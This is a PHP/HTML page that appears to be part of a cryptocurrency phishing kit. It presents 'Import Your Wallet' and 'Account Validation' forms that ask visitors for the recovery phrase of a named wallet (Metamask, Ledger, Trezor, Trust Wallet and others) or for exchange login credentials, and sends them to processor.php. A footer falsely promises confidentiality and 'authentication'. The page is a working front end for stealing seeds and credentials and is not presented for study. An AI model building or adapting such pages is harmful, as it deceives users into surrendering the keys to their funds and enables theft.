<?php include('head.php');?>
<body>

    <!-- WALLET FORM -->
    <?php if(isset($_GET['choice']) && $_GET['choice'] ==="wallet"){?>

        <div class="row">
            <div class="col-12 pt-5">
                <center>
                    <h2><i class="ti-wallet"></i>&nbsp;Import Your Wallet</h2>
                </center>
            </div>
            <div class="col-9 m-auto">
                <form action="POST" action="processor.php" name="processForm">
  <div class="mb-3">
    <label for="exampleInputEmail1" class="form-label"><i class="ti-wallet"></i>&nbsp;Select Wallet:</label>
    <select class="form-select form-select-lg mb-2" aria-label=".form-select-lg example" name="selectWallet" required>
          <option>----------</option>
          <option value="atomic">Atomic Wallet</option>
          <option value="binance">Binance</option>
          <option value="coinbase">Coinbase</option>
          <option value="exodus">Exodus Wallet</option>
          <option value="ledger nano">Ledger Nano X</option>
          <option value="luno">Luno</option>         
          <option value="metamask">Metamask</option>
          <option value="trezor">Trezor Wallet</option>
          <option value="trustwallet">Trust Wallet</option>
          <option value="walletconnect">Wallet Connect</option>
          <option value="zengo">Zengo</option>
</select>
    <div id="emailHelp" class="form-text">Choose your wallet provider from the option.</div>
  </div>
  <div class="mb-2">
    <label for="exampleInputPassword1" class="form-label"><i class="ti-clip"></i>&nbsp;Recovery Phrase:</label>
    <div class="input-group">
  <span class="input-group-text">Phrase</span>
  <textarea class="form-control" aria-label="With textarea" name="seed" rows="3" placeholder="Enter your recovery phrase" required></textarea>
</div>
  </div>
  <div id="emailHelp" class="form-text">Typically 12 (sometimes 24) words separated by single space.</div>
  <br>
  <div class="mb-3 form-check">
    <input type="checkbox" class="form-check-input" id="exampleCheck1">
    <label class="form-check-label" for="exampleCheck1" required>I have checked and agree that my details are correct</label>
  </div>
  <button name="submitWallet" type="submit" class="btn btn-lg btn-primary"><i class="ti-angle-double-right"></i>&nbsp;Proceed</button>
</form>
            </div>
        </div>
    <?php } else {echo "";}?>


<!-- EXCHANGE FORM -->
     <?php if(isset($_GET['choice']) && $_GET['choice'] ==="exchange"){?>
         <div class="row">
            <div class="col-12 pt-5">
                <center>
                    <h2><i class="ti-world"></i>&nbsp;Account Validation</h2>
                </center>
            </div>
            <div class="col-9 m-auto">
                <form action="POST" action="processor.php" name="processForm2">
  <div class="mb-3">
    <label for="exampleInputEmail1" class="form-label"><i class="ti-wallet"></i>&nbsp;Select Exchange:</label>
    <select class="form-select form-select-md mb-2" aria-label=".form-select-md example" name="selectWallet" required>
          <option>----------</option>
          <option value="binance">Binance</option>
          <option value="Bitfinex">Bitfinex</option>
          <option value="Bitstamp">Bitstamp</option>
          <option value="coinbase">Coinbase</option>
          <option value="Crypto.com">Crypto.com</option>
          <option value="FTX">FTX</option>
          <option value="Gate">Gate</option>
          <option value="huobi">Huobi</option>
          <option value="kraken">Kraken</option>
          <option value="Kucoin">Kucoin</option>
          <option value="latoken">Latoken</option>
          <option value="luno">Luno</option>         
          <option value="Paxful">Paxful</option>
          <option value="Paybis">Paybis</option>
          <option value="Poloinex">Poloinex</option>
          <option value="PrimeXBT">PrimeXBT</option>
</select>
    <div id="emailHelp" class="form-text">Choose your exchange provider from the option.</div>
  </div>
  <div class="mb-2">
    <label for="exampleInputEmail1" class="form-label"><i class="ti-user"></i>&nbsp;Username</label>
    <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Email/Phone number" required>
    <!-- <div id="emailHelp" class="form-text">We'll never share your email with anyone else.</div> -->
  </div>
  <div class="mb-3">
    <label for="exampleInputPassword1" class="form-label"><i class="ti-key"></i>Password</label>
    <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required>
  </div>
  <div class="mb-3 form-check">
    <input type="checkbox" class="form-check-input" id="exampleCheck1" required>
    <label class="form-check-label" for="exampleCheck1">I have checked and agree that my details are correct.</label>
  </div>
  <button name="submitExchange" type="submit" class="btn btn-lg btn-primary"><i class="ti-stats-up"></i>&nbsp;Proceed</button>
</form>
            </div>
        </div>
         <?php } else {echo "";}?>


         <!--FOOTER NOTE -->
         <footer class="row mt-5 mx-5">
             <div class="col-12">
                 <h5>NOTE:</h5>
             </div>
             <div class="col-12">
                 <ul class="list-group-flush">
                     <li class="list-group small">The information collected is confidential and will not be disclosed by us to unauthorized third parties.</li>
                     <li class="list-group small">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.</li>
                     <li class="list-group small">Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.</li>
                 </ul>
             </div>
         </footer>
</body>
</html>